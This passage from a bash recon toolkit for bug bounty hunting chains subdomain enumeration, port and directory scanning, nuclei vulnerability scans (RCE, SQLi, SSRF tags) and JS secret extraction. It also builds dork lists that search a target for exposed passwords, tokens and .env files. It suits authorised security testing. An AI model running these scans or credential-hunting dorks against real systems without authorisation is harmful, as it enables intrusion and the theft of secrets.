#################
# Recon Functions - UPDATED 2025 v4 — Bug Bounty Edition (MITRE ATT&CK Aligned)
#################

ResultsPath="$HOME/Recon"
ToolsPath="$HOME/Tools"
ConfigFolder="$HOME/.config"
GITHUB_TOKENS="${ToolsPath}/.github_tokens"
UserAgent="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
DIRS_LARGE="$HOME/Lists/raft-large-directories.txt"
DIRS_MEDIUM="$HOME/Lists/raft-medium-directories.txt"
BXSS_CALLBACK="${BXSS_CALLBACK:-}"   # set your XSS Hunter / interactsh endpoint

# httpx (ProjectDiscovery) — força o binário do Go pra evitar conflito com python3-httpx
if [ -x "$HOME/go/bin/httpx" ]; then
  HTTPX_BIN="$HOME/go/bin/httpx"
else
  HTTPX_BIN="$(command -v httpx 2>/dev/null)"
fi
export HTTPX_BIN

red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
blue=$(tput setaf 4)
bblue=$(tput bold; tput setaf 4)
byellow=$(tput bold; tput setaf 3)
reset=$(tput sgr0)

# ─── WORKSPACE ────────────────────────────────────────────────────────────────

workspaceRecon() {
  name=$(echo $1 | unfurl -u domains)
  wdir="$ResultsPath/$name/$(date +%F)/"
  mkdir -p "$wdir"
  cd "$wdir"
  echo "$name" | anew domains
  echo "${green}[+] Workspace: $wdir${reset}"
}

# ─── SUBDOMAIN ENUMERATION ────────────────────────────────────────────────────

subdomainenum() {
  echo "${yellow}[+] Recon subdomains...${reset}"
  Domain=$(cat domains)

  # Active sources (subfinder v2 - built-in multi-source)
  subfinder -nW -t 100 -all -o subfinder.subdomains -dL domains -silent
  cat subfinder.subdomains | anew all.subdomains && rm -f subfinder.subdomains

  # Amass passive (v4 syntax)
  amass enum -passive -norecursive -nf all.subdomains -df domains -o amass.subdomains 2>/dev/null
  cat amass.subdomains | anew all.subdomains && rm -f amass.subdomains

  # crt.sh
  curl -s "https://crt.sh/?q=%25.$Domain&output=json" | \
    jq -r '.[].name_value' | sed 's/\*\.//g' | anew all.subdomains

  # chaos (projectdiscovery)
  chaos -d "$Domain" -silent 2>/dev/null | anew all.subdomains

  # github-subdomains (with token if available)
  [ -f "$GITHUB_TOKENS" ] && \
    github-subdomains -d "$Domain" -t "$GITHUB_TOKENS" -o github.subs 2>/dev/null && \
    cat github.subs | anew all.subdomains && rm -f github.subs

  # uncover — search engines (shodan, fofa, censys)
  uncover -q "$Domain" -silent 2>/dev/null | unfurl domains | anew all.subdomains

  # Resolve
  cat all.subdomains | dnsx -silent -r "$HOME/Lists/resolvers-trusted.txt" | anew clean.subdomains
  echo "${green}[+] Passive subdomain recon completed: $(wc -l < clean.subdomains) hosts${reset}"
}

wellSubRecon() {
  subdomainenum
  # ASN → CIDR via asnmap (replaces metabigor for this)
  [ -s "domains" ] && asnmap -d "$(cat domains)" -silent 2>/dev/null | anew cidr
  [ -s "cidr" ] && cat cidr | anew clean.subdomains
  brutesub
}

certspotter() {
  curl -s "https://api.certspotter.com/v1/issuances?domain=$1&expand=dns_names&expand=issuer&expand=cert" | \
    jq -c '.[].dns_names' | grep -o '"[^"]\+"' | tr -d '"' | sort -fu
}

crtsh() {
  curl -s "https://crt.sh/?q=%.$1" | sed 's/<\/\?[^>]\+>//g' | grep "$1"
}

cert() {
  curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew
}

ipinfo() {
  curl -s "http://ipinfo.io/$1"
}

getfreshresolvers() {
  wget -q -O "$HOME/Lists/resolvers.txt"         "https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt"
  wget -q -O "$HOME/Lists/resolvers-trusted.txt" "https://raw.githubusercontent.com/trickest/resolvers/main/resolvers-trusted.txt"
}

getalltxt() {
  wget -q -O "$HOME/Lists/all.txt" \
    "https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt"
}

# ─── DNS RECORDS ──────────────────────────────────────────────────────────────

dnsrecords() {
  echo "${yellow}[+] Collecting DNS records${reset}"
  mkdir -p dnshistory
  cat clean.subdomains | dnsx -silent -a  -resp-only -o dnsx.txt
  cat clean.subdomains | dnsx -a   -resp -silent -o dnshistory/A-records
  cat clean.subdomains | dnsx -ns  -resp -silent -o dnshistory/NS-records
  cat clean.subdomains | dnsx -cname -resp -silent -o dnshistory/CNAME-records
  cat clean.subdomains | dnsx -soa -resp -silent -o dnshistory/SOA-records
  cat clean.subdomains | dnsx -ptr -resp -silent -o dnshistory/PTR-records
  cat clean.subdomains | dnsx -mx  -resp -silent -o dnshistory/MX-records
  cat clean.subdomains | dnsx -txt -resp -silent -o dnshistory/TXT-records
  cat clean.subdomains | dnsx -aaaa -resp -silent -o dnshistory/AAAA-records
  echo "${green}[+] DNS records saved in dnshistory/${reset}"
}

nstakeover() {
  for domain in $(cat "$1"); do
    dig "$domain" +trace | grep NS | awk '{print $5}' | anew | \
      grep -Ev "root-servers|NS|NSEC3|NSEC" | sed 's/\.$//' | \
      xargs -I{} bash -c "dig @{} $domain | grep -E 'SERVFAIL|REFUSED' && echo '$domain - {} Is vulnerable'"
  done
}

# ─── PORT SCANNING ────────────────────────────────────────────────────────────

naabuRecon() {
  echo "${yellow}[+] Naabu port scan${reset}"
  naabu -l clean.subdomains \
    -r "$HOME/Lists/resolvers.txt" \
    -ec \
    -p 80,443,81,300,591,593,832,981,1010,1099,1311,2082,2095,2096,2480,\
3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,\
6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,\
8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,\
8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,\
9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,\
55440,55672 \
    -sa -o naabuScanFull
  if [ -s "naabuScanFull" ]; then
    grep -oP '^[\w.\-]+:\d+$' naabuScanFull > naabuScan
    [ ! -s "naabuScan" ] && grep -v '^\[' naabuScanFull | grep -v '^$' > naabuScan
  fi
  echo "${green}[+] naabu: $(wc -l < naabuScan 2>/dev/null) hosts:portas${reset}"
}

naabuFullPorts() {
  naabu -p - -l clean.subdomains \
    -exclude-ports 80,443,8443,21,25,22 \
    -o full_ports.txt
}

# TLS fingerprinting via tlsx
tlsEnum() {
  echo "${yellow}[+] TLS Enumeration${reset}"
  cat clean.subdomains | tlsx -silent -san -cn -o tlsx_output.txt
  cat tlsx_output.txt | grep -oP '(?<=SAN: ).*' | sed 's/,/\n/g' | anew clean.subdomains
}

# ─── HTTP PROBING ─────────────────────────────────────────────────────────────

getalive() {
  echo "${yellow}[+] Check live hosts${reset}"

  if [ ! -s "naabuScan" ]; then
    echo "${red}[!] naabuScan vazio ou inexistente — abortando getalive${reset}"
    return 1
  fi

  # Script python para converter naabuScan -> URLs
  cat > /tmp/_naabu2url.py << 'PYEOF'
import sys
seen = set()
for line in open("naabuScan"):
    line = line.strip()
    if not line:
        continue
    last = line.rfind(":")
    host = line[:last]
    port = line[last+1:]
    url = "https://" + host if port == "443" else "http://" + host + ":" + port
    if url not in seen:
        seen.add(url)
        print(url)
PYEOF
  python3 /tmp/_naabu2url.py > .tmp_urls_probe.txt
  rm -f /tmp/_naabu2url.py

  # Usa httpx do ProjectDiscovery com user-agent real (HTTPX_BIN é global, definido no topo)
  cat .tmp_urls_probe.txt | $HTTPX_BIN \
    -sc -td -title -cl -favicon \
    -timeout 15 -threads 50 \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
    2>/dev/null | tee HTTPOK
  rm -f .tmp_urls_probe.txt

  if [ ! -s "HTTPOK" ]; then
    echo "${red}[!] HTTPOK vazio — nenhum host respondeu${reset}"
    return 1
  fi

  # Script python para classificar HTTPOK (lida com ANSI colors do httpx)
  cat > /tmp/_classify_http.py << 'PYEOF'
import re
all_urls, ok200, ok403, without404 = [], [], [], []
for line in open("HTTPOK"):
    line = re.sub(r"\x1b\[[0-9;]*m", "", line.strip())
    if not line:
        continue
    parts = line.split()
    if not parts:
        continue
    url = parts[0]
    codes = re.findall(r"\[(\d+)\]", line)
    status = codes[0] if codes else "000"
    all_urls.append(url)
    if status == "200":
        ok200.append(url)
    if status in ("400", "401", "402", "403"):
        ok403.append(url)
    if status != "404":
        without404.append(url)
open("ALLHTTP", "w").write("\n".join(sorted(set(all_urls))) + "\n")
open("200HTTP", "w").write("\n".join(sorted(set(ok200))) + "\n")
open("403HTTP", "w").write("\n".join(sorted(set(ok403))) + "\n")
open("Without404", "w").write("\n".join(sorted(set(without404))) + "\n")
PYEOF
  python3 /tmp/_classify_http.py
  rm -f /tmp/_classify_http.py

  echo "${green}[+] Live hosts  : $(wc -l < ALLHTTP)${reset}"
  echo "${green}[+]   200       : $(wc -l < 200HTTP)${reset}"
  echo "${green}[+]   403/40x   : $(wc -l < 403HTTP)${reset}"
  echo "${green}[+]   sem-404   : $(wc -l < Without404)${reset}"
}

# ─── SUBDOMAIN BRUTE-FORCE & PERMUTATION ─────────────────────────────────────

brutesub() {
  echo "${yellow}[+] Brute subdomains${reset}"
  getfreshresolvers
  getalltxt
  bruteTop1million
  bruteAlltxt
  echo "${green}[+] Brute complete${reset}"
}

bruteTop1million() {
  for domain in $(cat domains); do
    shuffledns -d "$domain" -r "$HOME/Lists/resolvers.txt" \
      -w "$HOME/Lists/subdomains-top1million-110000.txt" \
      -mode bruteforce -o brutesubs_out.txt 2>/dev/null
    [ -s "brutesubs_out.txt" ] && cat brutesubs_out.txt | anew clean.subdomains
  done
  rm -f brutesubs_out.txt
}

bruteAlltxt() {
  for domain in $(cat domains); do
    shuffledns -d "$domain" -r "$HOME/Lists/resolvers.txt" \
      -w "$HOME/Lists/all.txt" \
      -mode bruteforce -o brutesubs_out.txt 2>/dev/null
    [ -s "brutesubs_out.txt" ] && cat brutesubs_out.txt | anew clean.subdomains
  done
  rm -f brutesubs_out.txt
}

subPermutation() {
  echo "${yellow}[+] Permutation with alterx (replaces altdns)${reset}"
  cat clean.subdomains | alterx -silent | anew alt-output.txt
  shuffledns -l alt-output.txt -r "$HOME/Lists/resolvers.txt" -mode resolve -o final.txt 2>/dev/null
  cp clean.subdomains oldsubs
  [ -s 'alt-output.txt' ] && rm -rf alt-output.txt
  cat final.txt | anew clean.subdomains
  echo "${green}[+] Permutation done: $(wc -l < clean.subdomains) hosts${reset}"
}

# ─── CRAWLING & URL HARVESTING ────────────────────────────────────────────────

crawler() {
  echo "${yellow}[+] Crawler in action${reset}"
  Domain=$(cat domains)
  mkdir -p .tmp

  # gospider
  gospider -S Without404 -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w \
    --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" \
    --include-subs -q -o .tmp/gospider 2>/dev/null | anew -q gospider_out

  # waybackurls
  xargs -a Without404 -P 50 -I % bash -c "echo % | waybackurls" 2>/dev/null | anew -q waybackurls_out

  # gau v2 (updated flags)
  xargs -a Without404 -P 50 -I % bash -c \
    "gau % --blacklist eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt \
     --retries 3 --threads 5" 2>/dev/null | anew -q gau_out

  # katana (active crawl with JS rendering)
  katana -list Without404 -d 4 -jc -kf all \
    -ef eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt \
    -output katana_output.txt 2>/dev/null

  # waymore (wayback + common crawl)
  for domain in $(cat domains); do
    waymore -i "$domain" -mode U -oU ".tmp/waymore_${domain}.txt" 2>/dev/null
    cat ".tmp/waymore_${domain}.txt" 2>/dev/null | anew -q gau_out
  done

  # Merge & deduplicate
  cat gospider_out gau_out waybackurls_out katana_output.txt 2>/dev/null | \
    sed '/\[/d' | grep "$Domain" | sort -u | uro | anew -q crawlerResults.txt

  echo "${green}[+] Crawler done: $(wc -l < crawlerResults.txt) URLs${reset}"
}

# ─── JS ANALYSIS ──────────────────────────────────────────────────────────────

JScrawler() {
  katana -jc -d 5 -rd 5 -u 200HTTP \
    -ef eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt \
    -o crawlJS 2>/dev/null
  cat crawlJS | grep "\.js$" | fff -d 50 -S -o JSroot
}

getjsurls() {
  echo "${yellow}[+] Get JS files${reset}"
  Domain=$(cat domains)
  [ -s "crawlerResults.txt" ] && cat crawlerResults.txt | grep "$Domain" | \
    grep -Ei "\.(js)" | grep -iEv '(\.jsp|\.json)' | anew -q url_extract_js.txt
  [ -s "url_extract_js.txt" ] && cat url_extract_js.txt | cut -d '?' -f 1 | \
    grep -Ei "\.(js)" | grep -iEv '(\.jsp|\.json)' | grep "$Domain" | anew -q jsfile_links.txt
  [ -s "ALLHTTP" ] && cat ALLHTTP | subjs | grep "$Domain" | anew -q jsfile_links.txt
  [ -s "ALLHTTP" ] && cat ALLHTTP | getJS --complete | grep "$Domain" | anew -q jsfile_links.txt
  [ -s "jsfile_links.txt" ] && cat jsfile_links.txt | \
    $HTTPX_BIN -follow-redirects -random-agent -sc -retries 2 2>/dev/null | \
    grep '\[200\]' | grep -oP 'https?://\S+' | anew -q js_livelinks.txt
  [ -s "jsfile_links.txt" ] && cat js_livelinks.txt | fff -d 1 -S -o JSroot
  echo "${green}[+] JS files: $(wc -l < js_livelinks.txt 2>/dev/null)${reset}"
}

getjsdata() {
  echo "${yellow}[+] Secrets in JS${reset}"
  [ -s "js_livelinks.txt" ] && cat js_livelinks.txt | nuclei -tags exposure,token -H "$UserAgent" -o jsinfo
  [ -s "jsinfo" ] && notify -silent -bulk -data jsinfo -id nuclei
}

secretfinder() {
  echo "${yellow}[+] SecretFinder${reset}"
  regexs=$(curl -s 'https://gist.githubusercontent.com/mswell/1070fae0021b08d5e5650743ea402b4b/raw/589e669dec183009f01eca2c2ef1401b5f77af2b/regexJS' | tr '\n' '|')
  rush -i js_livelinks.txt \
    'python3 $HOME/Tools/SecretFinder/SecretFinder.py -i {} -o cli -r "\\w+($regexs)\\w+" | grep -v custom_regex | anew js_secrets_result'
  cat js_secrets_result | grep -v custom_regex | grep -iv '[URL]:' | anew JSPathNoUrl
  cat JSPathNoUrl | python3 "$HOME/Tools/BBTz/collector.py" JSOutput
}

awsCognitoFinder() {
  if [ ! -d "JSroot" ]; then
    echo "${yellow}[!] JSroot/ não existe — pulando awsCognitoFinder${reset}"
    return 0
  fi
  # Subshell isola o cd — se falhar, não afeta o shell pai
  (
    cd JSroot || exit 1
    grep -lri 'AWSCognitoIdentity' | anew ../awsVector
  )
  [ -s "awsVector" ] && echo "[+] AWS Cognito found!" | notify -silent -id nuclei
  [ -s "awsVector" ] && notify -silent -bulk -data awsVector -id nuclei
}

# ─── [NEW] CODE REVIEW — ANÁLISE ESTÁTICA DE CÓDIGO EXPOSTO ──────────────────
# MITRE: T1587.001 / T1213 - Source code leak / analysis

codeReview() {
  echo "${yellow}[+] Code Review — análise estática de código fonte exposto${reset}"
  mkdir -p code_review

  # Busca .git, .svn, .env, backup files expostos
  cat ALLHTTP | nuclei \
    -tags git,exposure,config,backup,env \
    -H "$UserAgent" \
    -o code_review/exposed_files.txt 2>/dev/null

  # Semgrep em arquivos JS baixados (análise SAST real)
  if command -v semgrep &>/dev/null && [ -d "JSroot" ]; then
    semgrep --config=auto \
      --config "p/javascript" \
      --config "p/nodejs" \
      --config "p/owasp-top-ten" \
      --config "p/xss" \
      --config "p/injection" \
      --config "p/secrets" \
      JSroot/ \
      --json -o code_review/semgrep_results.json 2>/dev/null
    # Converte para txt legível
    jq -r '.results[] | "[" + .check_id + "] " + .path + ":" + (.start.line|tostring) + " — " + .extra.message' \
      code_review/semgrep_results.json 2>/dev/null | anew code_review/semgrep_findings.txt
    echo "${green}[+] Semgrep findings: $(wc -l < code_review/semgrep_findings.txt 2>/dev/null)${reset}"
  fi

  # truffleHog — segredos com alta precisão em repos/arquivos
  if command -v trufflehog &>/dev/null && [ -d "JSroot" ]; then
    trufflehog filesystem JSroot/ \
      --json 2>/dev/null | jq -r '.SourceMetadata.Data.Filesystem.file + " — " + .DetectorName + ": " + .Raw' \
      | anew code_review/trufflehog_results.txt
    echo "${green}[+] TruffleHog: $(wc -l < code_review/trufflehog_results.txt 2>/dev/null) secrets${reset}"
  fi

  # gitleaks em código exposto
  if command -v gitleaks &>/dev/null && [ -d "JSroot" ]; then
    gitleaks detect --source JSroot/ \
      --report-format json --report-path code_review/gitleaks.json \
      --no-git 2>/dev/null
    jq -r '.[] | .RuleID + " — " + .File + ":" + (.StartLine|tostring) + " — " + .Secret' \
      code_review/gitleaks.json 2>/dev/null | anew code_review/gitleaks_findings.txt
    echo "${green}[+] Gitleaks: $(wc -l < code_review/gitleaks_findings.txt 2>/dev/null) secrets${reset}"
  fi

  # Padrões críticos em JS baixados (análise manual de sinks perigosos)
  if [ -d "JSroot" ]; then
    echo "${yellow}[>] Buscando sinks críticos nos JS...${reset}"
    grep -rn \
      -e "eval(" \
      -e "innerHTML" \
      -e "document.write(" \
      -e "\.src\s*=" \
      -e "location\.href" \
      -e "window\.location" \
      -e "fetch(" \
      -e "XMLHttpRequest" \
      -e "\.ajax(" \
      -e "postMessage(" \
      -e "localStorage\." \
      -e "sessionStorage\." \
      JSroot/ 2>/dev/null | anew code_review/js_sinks.txt
    echo "${green}[+] JS sinks: $(wc -l < code_review/js_sinks.txt 2>/dev/null) ocorrências${reset}"
  fi

  [ -s "code_review/exposed_files.txt" ] && notify -silent -bulk -data code_review/exposed_files.txt -id nuclei
  echo "${green}[+] Code review salvo em code_review/${reset}"
}

# ─── [NEW] DIRECTORY & FILE DISCOVERY ─────────────────────────────────────────
# MITRE: T1083 - File and Directory Discovery

dirDiscovery() {
  echo "${yellow}[+] Directory & File Discovery${reset}"
  mkdir -p dirs

  # ffuf diretórios em todos os hosts vivos (paralelo, 5 por vez)
  cat ALLHTTP | xargs -P 5 -I TARGET bash -c '
    HOST=$(echo TARGET | sed "s|[^a-zA-Z0-9._-]|_|g")
    ffuf -u "TARGET/FUZZ" \
      -w "$HOME/Lists/raft-large-directories.txt" \
      -mc 200,201,204,301,302,307,401,403,405 \
      -t 100 -s \
      -of json -o "dirs/dir_${HOST}.json" 2>/dev/null
  '

  # feroxbuster com recursão profunda nos 10 hosts mais interessantes
  cat 200HTTP | head -20 | xargs -P 3 -I TARGET bash -c '
    HOST=$(echo TARGET | sed "s|[^a-zA-Z0-9._-]|_|g")
    feroxbuster -u TARGET \
      -w "$HOME/Lists/raft-large-directories.txt" \
      --status-codes 200,204,301,307,401,405,400,302,403 \
      --depth 3 -k -t 50 -q \
      -o "dirs/ferox_${HOST}.txt" 2>/dev/null
  '

  # Consolida resultados
  find dirs/ -name "*.json" -exec jq -r '.results[]? | .url' {} \; 2>/dev/null | anew dirs/all_dirs.txt
  find dirs/ -name "ferox_*.txt" -exec cat {} \; 2>/dev/null | grep -oP 'https?://\S+' | anew dirs/all_dirs.txt

  echo "${green}[+] Directories found: $(wc -l < dirs/all_dirs.txt 2>/dev/null)${reset}"

  # Nuclei nos diretórios achados (exposures, configs sensíveis)
  [ -s "dirs/all_dirs.txt" ] && cat dirs/all_dirs.txt | nuclei \
    -tags exposure,config,backup,log,db \
    -H "$UserAgent" \
    -o dirs/dir_nuclei_findings.txt 2>/dev/null

  [ -s "dirs/dir_nuclei_findings.txt" ] && notify -silent -bulk -data dirs/dir_nuclei_findings.txt -id nuclei
}

# ─── [NEW] BACKUP & SENSITIVE FILE DISCOVERY ──────────────────────────────────

backupFileScan() {
  echo "${yellow}[+] Backup & Sensitive File Discovery${reset}"
  mkdir -p backups

  # Wordlist específica de arquivos sensíveis/backup
  cat ALLHTTP | xargs -P 5 -I TARGET bash -c '
    ffuf -u "TARGET/FUZZ" \
      -w "$HOME/Lists/raft-large-files.txt" \
      -mc 200,301,302 \
      -fc 404 -t 80 -s \
      -of json -o "backups/files_$(echo TARGET | md5sum | cut -c1-8).json" 2>/dev/null
  '

  find backups/ -name "*.json" -exec jq -r '.results[]? | .url' {} \; 2>/dev/null | anew backups/sensitive_files.txt

  # nuclei para arquivos de backup/config conhecidos
  cat ALLHTTP | nuclei \
    -tags backup,config,exposure,git,env,logs \
    -H "$UserAgent" \
    -o backups/nuclei_backup.txt 2>/dev/null

  echo "${green}[+] Sensitive files: $(wc -l < backups/sensitive_files.txt 2>/dev/null)${reset}"
  [ -s "backups/nuclei_backup.txt" ] && notify -silent -bulk -data backups/nuclei_backup.txt -id nuclei
}

# ─── [NEW] GOOGLE DORK — OSINT via motores de busca ──────────────────────────
# MITRE: T1593 - Search Open Technical Databases

googleDork() {
  echo "${yellow}[+] Google Dork — buscando arquivos e dados expostos${reset}"
  Domain=$(cat domains)
  mkdir -p dorks

  # Usa googler (CLI) ou dork manual com curl via SearXNG
  # Para uso real: instale 'googler' ou configure um SearXNG self-hosted
  DORKS=(
    "site:${Domain} ext:env OR ext:log OR ext:bak OR ext:sql OR ext:conf"
    "site:${Domain} inurl:admin OR inurl:login OR inurl:dashboard OR inurl:panel"
    "site:${Domain} inurl:api OR inurl:v1 OR inurl:v2 OR inurl:graphql"
    "site:${Domain} filetype:pdf OR filetype:xls OR filetype:xlsx OR filetype:doc"
    "site:${Domain} intext:password OR intext:secret OR intext:token OR intext:api_key"
    "site:${Domain} inurl:config OR inurl:setup OR inurl:install OR inurl:backup"
    "site:${Domain} ext:php inurl:id= OR inurl:user= OR inurl:page="
    "\"${Domain}\" site:pastebin.com OR site:pastecode.io OR site:justpaste.it"
    "\"@${Domain}\" site:linkedin.com"
    "site:github.com \"${Domain}\" password OR secret OR key OR token"
    "site:${Domain} inurl:swagger OR inurl:openapi OR inurl:api-docs"
    "site:${Domain} \"index of /\" OR \"directory listing\""
    "site:${Domain} inurl:.git OR inurl:.svn OR inurl:.hg"
    "site:${Domain} intext:\"sql syntax\" OR intext:\"mysql error\" OR intext:\"ORA-\""
    "site:trello.com \"${Domain}\""
    "site:s3.amazonaws.com \"${Domain}\""
  )

  echo "${blue}[*] Dorks gerados para o alvo: $Domain${reset}"
  for dork in "${DORKS[@]}"; do
    echo "[DORK] $dork" | anew dorks/dork_list.txt
  done

  # Se googler estiver instalado, executa automaticamente
  if command -v googler &>/dev/null; then
    echo "${yellow}[+] Executando dorks via googler...${reset}"
    for dork in "${DORKS[@]}"; do
      googler --noua -n 10 -C "$dork" 2>/dev/null | grep "http" | anew dorks/dork_results.txt
      sleep 5  # evita rate limiting
    done
    echo "${green}[+] Dork results: $(wc -l < dorks/dork_results.txt 2>/dev/null)${reset}"
  else
    echo "${yellow}[!] googler não encontrado. Instale com: pip install googler${reset}"
    echo "${yellow}[!] Dorks salvos em: dorks/dork_list.txt — execute manualmente${reset}"
  fi

  # github-dorking via gh-dork (GitHub Search API)
  if command -v gh &>/dev/null && [ -f "$GITHUB_TOKENS" ]; then
    echo "${yellow}[+] GitHub dorking...${reset}"
    GH_DORKS=(
      "${Domain} password"
      "${Domain} secret"
      "${Domain} api_key"
      "${Domain} token"
      "${Domain} .env"
      "${Domain} internal"
      "${Domain} staging"
    )
    for gdork in "${GH_DORKS[@]}"; do
      gh search code "$gdork" --limit 50 2>/dev/null | anew dorks/github_dork_results.txt
      sleep 2
    done
    echo "${green}[+] GitHub dorks: $(wc -l < dorks/github_dork_results.txt 2>/dev/null) resultados${reset}"
  fi

  echo "${green}[+] Google dork completo. Resultados em dorks/${reset}"
  [ -s "dorks/dork_results.txt" ] && notify -silent -bulk -data dorks/dork_results.txt -id nuclei
}

# ─── [NEW] OSINT AVANÇADO ─────────────────────────────────────────────────────
# MITRE: T1596, T1593, T1591

osintRecon() {
  echo "${yellow}[+] OSINT Avançado${reset}"
  Domain=$(cat domains)
  mkdir -p osint

  # theHarvester — emails, funcionários, tecnologias
  if command -v theHarvester &>/dev/null; then
    theHarvester -d "$Domain" -b all -l 500 \
      -f osint/theharvester_results.xml 2>/dev/null
    cat osint/theharvester_results.xml 2>/dev/null | \
      grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | anew osint/emails.txt
  fi

  # Shodan via uncover (host discovery)
  uncover -q "ssl:\"$Domain\"" -e shodan -silent 2>/dev/null | anew osint/shodan_hosts.txt
  uncover -q "hostname:\"$Domain\"" -e shodan -silent 2>/dev/null | anew osint/shodan_hosts.txt

  # Wayback Machine — versões antigas do alvo
  echo "${yellow}[>] Wayback Machine snapshots...${reset}"
  curl -s "http://web.archive.org/cdx/search/cdx?url=*.${Domain}&output=text&fl=original&collapse=urlkey&limit=10000" \
    2>/dev/null | anew osint/wayback_urls.txt

  # IP history via SecurityTrails-like sources
  curl -s "https://api.hackertarget.com/hostsearch/?q=$Domain" 2>/dev/null | anew osint/hackertarget.txt
  curl -s "https://api.hackertarget.com/reverseiplookup/?q=$(dig +short $Domain | head -1)" 2>/dev/null | anew osint/reverseip.txt

  # ASN enumeration
  asnmap -d "$Domain" -silent 2>/dev/null | anew osint/asn_ranges.txt

  echo "${green}[+] OSINT salvo em osint/${reset}"
}

# ─── [NEW] TECHNOLOGY FINGERPRINTING ─────────────────────────────────────────
# MITRE: T1592.002

techFingerprint() {
  echo "${yellow}[+] Technology Fingerprinting${reset}"
  mkdir -p techstack

  # httpx com tech detection (já existe em getalive, aqui detalhado)
  cat ALLHTTP | $HTTPX_BIN -td -server -title -sc -tech-detect \
    -H "$UserAgent" -o techstack/tech_detailed.txt 2>/dev/null

  # webanalyze (wappalyzer CLI)
  if command -v webanalyze &>/dev/null; then
    cat ALLHTTP | xargs -P 5 -I TARGET \
      webanalyze -host TARGET -apps "$HOME/Tools/webanalyze/technologies.json" 2>/dev/null | \
      anew techstack/webanalyze.txt
  fi

  # Nuclei — fingerprint de tecnologias e versões
  cat ALLHTTP | nuclei \
    -tags tech,fingerprint,version \
    -H "$UserAgent" \
    -o techstack/nuclei_tech.txt 2>/dev/null

  # Extrai tecnologias únicas para targeting de CVEs
  grep -oP '\[tech:[^\]]+\]' techstack/tech_detailed.txt 2>/dev/null | sort -u > techstack/unique_tech.txt
  echo "${green}[+] Tech stack: $(wc -l < techstack/unique_tech.txt 2>/dev/null) tecnologias identificadas${reset}"
}

# ─── [NEW] CVE INTELIGENTE (baseado em tech stack) ────────────────────────────
# Substitui nucauto genérico — foca em CVEs relevantes para o alvo

smartCveScan() {
  echo "${yellow}[+] Smart CVE Scan — baseado no tech stack detectado${reset}"
  mkdir -p cve_results

  # CVEs de alta/crítica severidade com rate-limit gentil
  cat ALLHTTP | nuclei \
    -severity high,critical \
    -H "$UserAgent" \
    -rate-limit 50 \
    -eid expired-ssl,mismatched-ssl,deprecated-tls,weak-cipher-suites,self-signed-ssl \
    -o cve_results/high_critical.txt 2>/dev/null

  # CVEs médios separados (menos ruído)
  cat ALLHTTP | nuclei \
    -severity medium \
    -H "$UserAgent" \
    -rate-limit 30 \
    -tags cve \
    -eid expired-ssl,mismatched-ssl,deprecated-tls,weak-cipher-suites,self-signed-ssl \
    -o cve_results/medium.txt 2>/dev/null

  # cvemap — mapeia CVEs pelos techs identificados
  if command -v cvemap &>/dev/null && [ -s "techstack/unique_tech.txt" ]; then
    while IFS= read -r tech; do
      tech_clean=$(echo "$tech" | tr -d '[]tech:' | tr -d ' ')
      cvemap -q "$tech_clean" -severity high,critical -silent 2>/dev/null | \
        anew cve_results/cvemap_${tech_clean}.txt
    done < techstack/unique_tech.txt
  fi

  echo "${green}[+] CVE results:${reset}"
  echo "  High/Critical: $(wc -l < cve_results/high_critical.txt 2>/dev/null)"
  echo "  Medium:        $(wc -l < cve_results/medium.txt 2>/dev/null)"

  [ -s "cve_results/high_critical.txt" ] && notify -silent -bulk -data cve_results/high_critical.txt -id nuclei
}

# ─── [NEW] NUCLEI COM FILTRO ANTI-FALSO-POSITIVO ─────────────────────────────

nucleiQuality() {
  echo "${yellow}[+] Nuclei quality scan (anti false-positive)${reset}"
  mkdir -p nuclei_quality

  # Apenas templates verificados (verified=true no metadata)
  cat ALLHTTP | nuclei \
    -H "$UserAgent" \
    -severity medium,high,critical \
    -tags "cve,exposure,rce,sqli,ssrf,lfi,ssti,xss,xxe,idor,misconfig" \
    -eid "expired-ssl,mismatched-ssl,deprecated-tls,weak-cipher-suites,self-signed-ssl,host-header-injection" \
    -stats \
    -rate-limit 100 \
    -bulk-size 25 \
    -c 25 \
    -retries 2 \
    -timeout 10 \
    -o nuclei_quality/findings.txt 2>/dev/null

  # Segunda passagem: apenas high/critical para validação extra
  [ -s "nuclei_quality/findings.txt" ] && \
    grep -E '\[high\]|\[critical\]' nuclei_quality/findings.txt | \
    anew nuclei_quality/confirmed_hc.txt

  echo "${green}[+] Quality findings: $(wc -l < nuclei_quality/findings.txt 2>/dev/null)${reset}"
  echo "${green}[+] High/Critical:    $(wc -l < nuclei_quality/confirmed_hc.txt 2>/dev/null)${reset}"

  [ -s "nuclei_quality/confirmed_hc.txt" ] && notify -silent -bulk -data nuclei_quality/confirmed_hc.txt -id nuclei
}

# ─── NUCLEI SCANS ─────────────────────────────────────────────────────────────

updateTemplatesNuc() {
  nuclei -update-templates
}

panelNuc() {
  echo "${yellow}[+] Panel scan${reset}"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -tags panel -H "$UserAgent" -o nucPanel
  [ -s "nucPanel" ] && echo "Panel found" | notify -silent -id nuclei
